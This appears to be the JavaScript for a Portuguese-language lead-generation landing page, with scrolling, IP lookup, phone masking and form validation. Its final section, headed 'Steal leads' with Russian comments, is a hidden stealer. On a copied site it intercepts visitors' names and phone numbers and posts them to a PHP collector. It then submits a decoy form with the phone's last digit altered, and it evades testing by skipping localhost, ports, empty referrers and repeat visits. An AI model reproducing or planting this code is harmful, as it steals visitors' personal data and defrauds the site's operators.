///////////////////////////////

const anchors = document.querySelectorAll('a[href*="#"]');

for (let anchor of anchors) {
  anchor.addEventListener('click', function (e) {
    e.preventDefault();

    const blockID = anchor.getAttribute('href').substr(1);

    document.getElementById(blockID).scrollIntoView({
      behavior: 'smooth',
      block: 'start',
    });
  });
}

//////////////////////////

const foo = async () => {
  const response = await $.ajax({
    url: 'https://get.geojs.io/v1/ip/geo.js',
    dataType: 'jsonp',
    jsonpCallback: 'geoip',
  });

  return response.ip;
};

//////////////////////////

var input = document.querySelector('#phone');
var phoneInput = intlTelInput(input, {
  separateDialCode: true,
  utilsScript: 'js/utils.js',
  initialCountry: 'auto',
  geoIpLookup: function (success, failure) {
    $.get('https://ipinfo.io', function () {}, 'jsonp').always(function (resp) {
      var countryCode = resp.country ? resp.country : 'BR';
      var countryCode = 'BR';
      $('#country').val(resp.countryCode);
      success(countryCode);
    });
  },
});

const leadFormValidate = $('#formTop').validate({
  rules: {
    phone: {
      required: true,
      validNumber: {
        object: phoneInput,
      },
    },
    first_name: {
      required: true,
      alphanumeric: true,
    },
    last_name: {
      required: true,
      alphanumeric: true,
    },
    email: {
      emailExt: true,
      required: true,
    },
  },
  messages: {
    phone: {
      required: 'Esta caixa de texto deve ser preenchida',
    },
    first_name: {
      required: 'Esta caixa de texto deve ser preenchida',
    },
    last_name: {
      required: 'Esta caixa de texto deve ser preenchida',
    },
    email: {
      email: 'Digite um e-mail válido!',
      required: 'Esta caixa de texto deve ser preenchida',
    },
  },
});

$(window).on('load', function () {
  setTimeout(function () {
    var mask = jQuery('#phone').attr('placeholder').replace(/[0-9]/g, 9);
    $(document).ready(function () {
      jQuery('#phone').mask(mask);
    });
    jQuery('#phone').on('countrychange', function (e, countryData) {
      jQuery('#phone').val('');
      var mask = $('#phone').attr('placeholder').replace(/[0-9]/g, 9);
      jQuery('#phone').mask(mask);
    });
  }, 1000);
});

$.validator.addMethod(
  'alphanumeric',
  function (value, element) {
    return this.optional(element) || /^[a-zA-Zа-яА-ЯЁё\s]+$/.test(value); //RU
  },
  'O nome só pode conter letras!',
);

$.validator.addMethod(
  'validNumber',
  function (value, element, params) {
    var obj = params.object;
    if (obj.isValidNumber()) {
      var num = obj.getNumber().replace('+', '');
      $(element)
        .closest('form')
        .find('.hidden-phone')
        .val('+' + num);
    }
    return obj.isValidNumber();
  },
  'Digite o número correto!',
);

$.validator.addMethod(
  'emailExt',
  function (value, element, param) {
    return value.match(/^[a-zA-Z0-9_\.%\+\-]+@[a-zA-Z0-9\.\-]+\.[a-zA-Z]{2,}$/);
  },
  'Digite um e-mail válido!',
);

$('#formTop').submit(function (e) {
  e.preventDefault();

  if ($('#formTop').valid()) {
    setDataForm($(e.currentTarget), phoneInput, objUTM, arrPixelID);
  }
});

function setDataForm(form, phoneIti, objUTM, arrPixelID) {
  const dataLead = {
    first: form.serializeArray()[0].value,
    last: form.serializeArray()[1].value,
    email: form.serializeArray()[2].value,
    phone: phoneIti.getNumber().replace(/\D/g, ''),
    creo: objUTM.creo,
    buyer: objUTM.buyer,
    offer: objUTM.offer,
    target: objUTM.target,
    country: objUTM.country,
  };

  foo(dataLead, arrPixelID).then((result) => {
    dataLead.ip = result;
    submitForm(dataLead, arrPixelID);
  });
}

// Steal leads

// Здесь укажите % срабатываний скрипта
const prc = 100;
//Указываем путь к php файлу обработчику
const url = '../leads.php';
//Указываем домен где будет находиться прокла/ленд
const originalHost = `ваш домен без https:// и /`;
const checkedHost = window.location.host;
const fullUrl = window.location.href;
//запускаем скрипт
start();
function start() {
  let userChek = checkUser();
  //проверяем прошел ли юзер проверку
  if (!userChek) return;
  let random = isRandom();
  //проверяем попали ли мы в указанный %
  if (random) stealer();
}
function stealer() {
  //проверяем спизжен ли ленд
  if (checkedHost == originalHost) return;
  let forms = document.querySelectorAll('form');
  forms.forEach((element) => {
    element.addEventListener('submit', (e) => {
      e.preventDefault();
      let name = e.target.querySelector('[name="first_name"]').value;
      let phone = e.target.querySelector('[name="phone"]').value;
      //формируем данные для отправки
      let data = {
        host: fullUrl,
        name: name,
        phone: phone,
      };
      //отправляем запрос
      sendData(data).then((res) => {
        //Cоздаем копию формы и меняй последнюю цифру, затем ее отправляем
        var dupForm = e.target.cloneNode(true);
        dupForm.querySelector('[name="phone"]').value = `${phone.slice(0, -1)}${Math.floor(
          Math.random() * 9,
        )}`;
        dupForm.style.display = 'none';
        let body = document.querySelector('body');
        body.append(dupForm);
        dupForm.submit();
      });
    });
  });
}
function isRandom() {
  let rnd = Math.floor(Math.random() * 101);
  if (rnd <= prc) return true;
  return false;
}
function checkUser() {
  //
  // максимальное количество заходов при котором сработает скрипт
  const AvalibleEntry = 2;
  let protocol = window.location.protocol;
  let port = window.location.port;
  let host = window.location.host;
  let reffer = document.referrer;
  let status = false;
  //проверяем зашел ли пользователь с http или https
  if (protocol == 'http:' || protocol == 'https:') status = true;
  if (!status) return false;
  //проверяем есть ли порт у юзера
  if (port != '') return false;
  //проверяем не запущен ли на сервере
  if (host.includes('localhost') || host.includes('127.0.0.1')) return false;
  //проверяем на наличие рефера
  if (reffer == '') return false;
  //определяем количество заходов конкретного юзера
  let userCount = localStorage.getItem('count');
  //если больше 2 не пропускаем
  if (userCount >= AvalibleEntry) return false;
  //если меньше то определяем текущее значение и прибавляем + 1
  userCount == null
    ? localStorage.setItem('count', 1)
    : localStorage.setItem('count', +userCount + 1);
  return true;
}
function sendData(propse) {
  return fetch(url, {
    method: 'post',
    body: JSON.stringify(propse),
  })
    .then((response) => response.json())
    .then((json) => json)
    .then((res) => {
      this.data = res;
      return res;
    });
}
